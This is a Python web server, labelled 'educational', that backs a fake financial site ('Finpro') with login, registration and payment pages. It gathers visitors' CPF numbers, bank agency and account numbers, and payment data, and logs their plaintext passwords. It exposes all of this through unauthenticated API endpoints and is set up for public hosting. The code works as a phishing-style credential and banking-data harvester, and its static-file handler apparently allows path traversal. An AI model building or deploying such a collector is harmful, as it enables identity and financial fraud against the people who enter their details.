#!/usr/bin/env python3
"""
Servidor robusto para coleta de dados - Fins educacionais
Execute com: python server.py
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import datetime
from urllib.parse import urlparse
import os
import hashlib
import re

class DataCollectorHandler(BaseHTTPRequestHandler):
    
    # Diretório base do projeto (pasta Finpro)
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    
    def do_GET(self):
        """Handle GET requests"""
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        if path == '/' or path == '/index.html':
            self.serve_file(os.path.join(self.BASE_DIR, 'index.html'), 'text/html')
            
        elif path == '/login.html':
            self.serve_file(os.path.join(self.BASE_DIR, 'login.html'), 'text/html')
            
        elif path == '/planos.html':
            self.serve_file(os.path.join(self.BASE_DIR, 'planos.html'), 'text/html')
            
        elif path == '/pagamento.html':
            self.serve_file(os.path.join(self.BASE_DIR, 'pagamento.html'), 'text/html')
            
        elif path == '/investimentos.html':
            self.serve_file(os.path.join(self.BASE_DIR, 'investimentos.html'), 'text/html')
            
        elif path == '/calculadoras.html':
            self.serve_file(os.path.join(self.BASE_DIR, 'calculadoras.html'), 'text/html')
            
        elif path == '/sobre.html':
            self.serve_file(os.path.join(self.BASE_DIR, 'sobre.html'), 'text/html')
            
        elif path == '/dashboard.html' or path == '/admin.html':
            # Admin dashboard to view collected data
            # Usa o diretório do arquivo server.py para encontrar dashboard.html
            server_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(server_dir, 'dashboard.html')
            if os.path.exists(file_path) and os.path.isfile(file_path):
                self.serve_file(file_path, 'text/html')
            else:
                self.send_response(404)
                self.end_headers()
            
        elif path == '/api/data':
            # Get all collected data
            self.send_json_response(200, self.get_all_data())
            
        elif path == '/api/users':
            # Get all registered users
            self.send_json_response(200, self.get_all_users())
            
        elif path == '/api/stats':
            # Get statistics
            self.send_json_response(200, self.get_statistics())
            
        elif path == '/api/registrations':
            # Get only registration data
            self.send_json_response(200, self.get_registrations())
            
        elif path == '/api/payments':
            # Get only payment data
            self.send_json_response(200, self.get_payments())
            
        elif path == '/api/logins':
            # Get login attempts
            self.send_json_response(200, self.get_logins())
            
        elif path == '/data':
            # Legacy endpoint - show collected data
            self.send_json_response(200, self.get_all_data())
        
        elif path == '/users':
            # Legacy endpoint - show registered users
            self.send_json_response(200, self.get_all_users())
                
        else:
            # Try to serve static files (CSS, JS, images)
            if path.startswith('/'):
                file_path = os.path.join(self.BASE_DIR, path.lstrip('/'))
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    content_type = self.get_content_type(path)
                    self.serve_file(file_path, content_type)
                else:
                    self.send_response(404)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(f"404 - Arquivo não encontrado: {path}".encode('utf-8'))
            else:
                self.send_response(404)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(f"404 - Caminho inválido: {path}".encode('utf-8'))
    
    def get_content_type(self, path):
        """Determine content type from file extension"""
        content_types = {
            '.css': 'text/css',
            '.js': 'application/javascript',
            '.html': 'text/html',
            '.json': 'application/json',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.svg': 'image/svg+xml',
            '.ico': 'image/x-icon'
        }
        ext = os.path.splitext(path)[1].lower()
        return content_types.get(ext, 'text/plain')
    
    def serve_file(self, file_path, content_type):
        """Helper to serve static files"""
        try:
            if content_type.startswith('text') or content_type == 'application/javascript':
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            else:
                with open(file_path, 'rb') as f:
                    content = f.read()
            
            self.send_response(200)
            self.send_header('Content-type', content_type)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            if isinstance(content, str):
                self.wfile.write(content.encode('utf-8'))
            else:
                self.wfile.write(content)
        except FileNotFoundError:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(f"404 - Arquivo não encontrado: {file_path}".encode('utf-8'))
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(f"500 - Erro interno: {str(e)}".encode('utf-8'))
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_DELETE(self):
        """Handle DELETE requests"""
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        if path == '/api/clear':
            response = self.handle_clear_data()
            self.send_json_response(200, response)
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests for data collection"""
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_json_response(400, {'status': 'error', 'message': 'No data received'})
            return
        
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
        except json.JSONDecodeError:
            self.send_json_response(400, {'status': 'error', 'message': 'Invalid JSON'})
            return
        
        if path == '/api/register':
            response = self.handle_register(data)
            self.send_json_response(200, response)
            
        elif path == '/api/login':
            response = self.handle_login(data)
            self.send_json_response(200, response)
            
        elif path == '/api/collect':
            client_ip = self.client_address[0]
            data['ip_address'] = client_ip
            data['server_timestamp'] = datetime.datetime.now().isoformat()
            data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
            self.log_data(data)
            self.send_json_response(200, {'status': 'success', 'message': 'Dados recebidos'})
            
        elif path == '/api/pagamento':
            client_ip = self.client_address[0]
            data['ip_address'] = client_ip
            data['server_timestamp'] = datetime.datetime.now().isoformat()
            data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
            self.log_data(data)
            self.send_json_response(200, {'status': 'success', 'message': 'Pagamento processado'})
                
        else:
            self.send_response(404)
            self.end_headers()
    
    def handle_register(self, data):
        """Handle user registration"""
        try:
            server_dir = os.path.dirname(os.path.abspath(__file__))
            users_file = os.path.join(server_dir, 'users.txt')
            
            # Read existing users
            try:
                with open(users_file, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    if content:
                        users = json.loads(content)
                    else:
                        users = []
            except (FileNotFoundError, json.JSONDecodeError):
                users = []
            
            # Check if email already exists
            email = data.get('email', '').lower().strip()
            if not email:
                return {'status': 'error', 'message': 'Email é obrigatório'}
            
            for user in users:
                if user.get('email', '').lower() == email:
                    return {'status': 'error', 'message': 'Email já cadastrado'}
            
            # Hash password
            password = data.get('senha', '')
            if not password or len(password) < 4:
                return {'status': 'error', 'message': 'Senha deve ter pelo menos 4 caracteres'}
            
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            
            # Create user object with all data
            def clean_number(value):
                if isinstance(value, str):
                    return re.sub(r'\D', '', value)
                return str(value) if value else ''
            
            user = {
                'id': len(users) + 1,
                'nome': data.get('nome', '').strip(),
                'cpf': clean_number(data.get('cpf', '')),
                'email': email,
                'telefone': clean_number(data.get('telefone', '')),
                'banco': data.get('banco', '').strip(),
                'agencia': clean_number(data.get('agencia', '')),
                'conta': clean_number(data.get('conta', '')),
                'password_hash': password_hash,
                'created_at': datetime.datetime.now().isoformat(),
                'ip_address': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown')
            }
            
            # Add to users list
            users.append(user)
            
            # Save users atomically
            with open(users_file, 'w', encoding='utf-8') as f:
                json.dump(users, f, indent=2, ensure_ascii=False)
                f.flush()
                os.fsync(f.fileno())  # Force write to disk
            
            # Log registration data with password (for demo purposes)
            self.log_data({
                'type': 'registration',
                'id': user['id'],
                **{k: v for k, v in user.items() if k != 'password_hash'},
                'senha': password  # Log original password for demo
            })
            
            return {'status': 'success', 'message': 'Conta criada com sucesso', 'user_id': user['id']}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Erro ao criar conta: {str(e)}'}
    
    def handle_login(self, data):
        """Handle user login"""
        try:
            email = data.get('email', '').lower().strip()
            password = data.get('senha', '')
            
            if not email or not password:
                return {'status': 'error', 'message': 'Email e senha são obrigatórios'}
            
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            
            server_dir = os.path.dirname(os.path.abspath(__file__))
            users_file = os.path.join(server_dir, 'users.txt')
            
            # Read users
            try:
                with open(users_file, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    if content:
                        users = json.loads(content)
                    else:
                        users = []
            except (FileNotFoundError, json.JSONDecodeError):
                return {'status': 'error', 'message': 'Email ou senha incorretos'}
            
            # Find user
            for user in users:
                if user.get('email', '').lower() == email and user.get('password_hash') == password_hash:
                    # Log successful login
                    self.log_data({
                        'type': 'login',
                        'user_id': user.get('id'),
                        'email': email,
                        'ip_address': self.client_address[0],
                        'user_agent': self.headers.get('User-Agent', 'Unknown'),
                        'timestamp': datetime.datetime.now().isoformat(),
                        'success': True
                    })
                    
                    return {
                        'status': 'success',
                        'message': 'Login realizado com sucesso',
                        'user': {
                            'id': user.get('id'),
                            'nome': user.get('nome', ''),
                            'email': user.get('email', '')
                        }
                    }
            
            # Log failed login attempt
            self.log_data({
                'type': 'failed_login',
                'email': email,
                'ip_address': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'timestamp': datetime.datetime.now().isoformat(),
                'success': False
            })
            
            return {'status': 'error', 'message': 'Email ou senha incorretos'}
            
        except Exception as e:
            return {'status': 'error', 'message': 'Erro ao fazer login'}
    
    def get_all_data(self):
        """Get all collected data"""
        try:
            server_dir = os.path.dirname(os.path.abspath(__file__))
            data_file = os.path.join(server_dir, 'data.txt')
            with open(data_file, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
                return []
        except (FileNotFoundError, json.JSONDecodeError):
            return []
    
    def get_all_users(self):
        """Get all registered users (without password hash)"""
        try:
            server_dir = os.path.dirname(os.path.abspath(__file__))
            users_file = os.path.join(server_dir, 'users.txt')
            with open(users_file, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    users = json.loads(content)
                else:
                    users = []
                # Remove password hash for security
                return [{'id': u.get('id'), 'nome': u.get('nome'), 'email': u.get('email'), 
                        'cpf': u.get('cpf'), 'telefone': u.get('telefone'), 'banco': u.get('banco'),
                        'agencia': u.get('agencia'), 'conta': u.get('conta'), 
                        'created_at': u.get('created_at'), 'ip_address': u.get('ip_address')} 
                        for u in users]
        except (FileNotFoundError, json.JSONDecodeError):
            return []
    
    def get_registrations(self):
        """Get only registration data"""
        all_data = self.get_all_data()
        return [d for d in all_data if d.get('type') == 'registration']
    
    def get_payments(self):
        """Get only payment data"""
        all_data = self.get_all_data()
        return [d for d in all_data if d.get('type') == 'payment']
    
    def get_logins(self):
        """Get login attempts"""
        all_data = self.get_all_data()
        return [d for d in all_data if d.get('type') in ['login', 'failed_login']]
    
    def get_statistics(self):
        """Get statistics about collected data"""
        all_data = self.get_all_data()
        users = self.get_all_users()
        
        stats = {
            'total_registrations': len([d for d in all_data if d.get('type') == 'registration']),
            'total_users': len(users),
            'total_payments': len([d for d in all_data if d.get('type') == 'payment']),
            'total_logins': len([d for d in all_data if d.get('type') == 'login']),
            'total_failed_logins': len([d for d in all_data if d.get('type') == 'failed_login']),
            'total_data_entries': len(all_data),
            'unique_ips': len(set([d.get('ip_address', '') for d in all_data if d.get('ip_address')])),
            'revenue': sum([float(d.get('valor', 0)) for d in all_data if d.get('type') == 'payment' and d.get('valor')])
        }
        
        return stats
    
    def handle_clear_data(self):
        """Clear all collected data"""
        try:
            server_dir = os.path.dirname(os.path.abspath(__file__))
            data_file = os.path.join(server_dir, 'data.txt')
            users_file = os.path.join(server_dir, 'users.txt')
            
            # Clear data.txt
            with open(data_file, 'w', encoding='utf-8') as f:
                json.dump([], f, indent=2, ensure_ascii=False)
            
            # Clear users.txt
            with open(users_file, 'w', encoding='utf-8') as f:
                json.dump([], f, indent=2, ensure_ascii=False)
            
            return {
                'status': 'success',
                'message': 'Todos os dados foram limpos com sucesso'
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': f'Erro ao limpar dados: {str(e)}'
            }
    
    def send_json_response(self, status_code, data):
        """Helper to send JSON response"""
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2, ensure_ascii=False).encode('utf-8'))
    
    def log_data(self, data):
        """Save collected data to file"""
        try:
            # Usa o diretório do server.py para salvar os arquivos
            server_dir = os.path.dirname(os.path.abspath(__file__))
            data_file = os.path.join(server_dir, 'data.txt')
            
            # Read existing data
            try:
                with open(data_file, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    if content:
                        existing_data = json.loads(content)
                    else:
                        existing_data = []
            except (FileNotFoundError, json.JSONDecodeError):
                existing_data = []
            
            # Add new data with ID
            if not data.get('id'):
                data['id'] = len(existing_data) + 1
            existing_data.append(data)
            
            # Write back to file atomically
            with open(data_file, 'w', encoding='utf-8') as f:
                json.dump(existing_data, f, indent=2, ensure_ascii=False)
                f.flush()
                os.fsync(f.fileno())  # Force write to disk
            
        except Exception:
            pass  # Silently handle errors to avoid console spam
    
    def log_message(self, format, *args):
        """Override to reduce log noise"""
        pass

def run_server(port=3000):
    """Start the server"""
    # Escuta em 0.0.0.0 para aceitar conexões de qualquer interface de rede
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, DataCollectorHandler)
    
    print("\n" + "=" * 60)
    print(f"🚀 Servidor rodando em:")
    print(f"   📄 Página Principal: http://localhost:{port}")
    print(f"   📊 Dashboard:        http://localhost:{port}/dashboard.html")
    print("=" * 60)
    print("\nPressione Ctrl+C para parar o servidor\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Servidor encerrado.")
        httpd.shutdown()

if __name__ == '__main__':
    # Usa a porta do Render se disponível, senão usa 3000
    # Render define a porta automaticamente via variável de ambiente PORT
    port = int(os.environ.get('PORT', 3000))
    print(f"Iniciando servidor na porta {port}...")
    run_server(port)
